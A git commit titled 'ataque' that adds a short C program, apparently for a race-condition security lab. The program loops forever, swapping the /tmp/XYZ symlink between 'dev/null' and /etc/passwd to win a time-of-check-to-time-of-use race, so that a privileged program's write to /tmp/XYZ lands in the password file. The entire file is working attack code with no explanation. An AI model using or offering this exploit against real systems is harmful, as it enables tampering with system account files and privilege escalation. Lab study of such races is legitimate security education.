bcb9122efafca29303a7e0a536daa7db47fde980
cesartoshiro <48112790+cesartoshiro@users.noreply.github.com>
2023-11-19 15:29:30 -0600

    ataque

---
+++ ataqueProceso.c
@@ -0,0 +1,15 @@
+#include <unistd.h>
+
+int main(){
+	while(1) {
+		unlink("/tmp/XYZ");
+		symlink("dev/null", "/tmp/XYZ");
+		usleep(100);
+
+		unlink("/tmp/XYZ");
+		symlink("/etc/passwd", "/tmp/XYZ");
+		usleep(100);
+	}
+
+	return(0);
+}
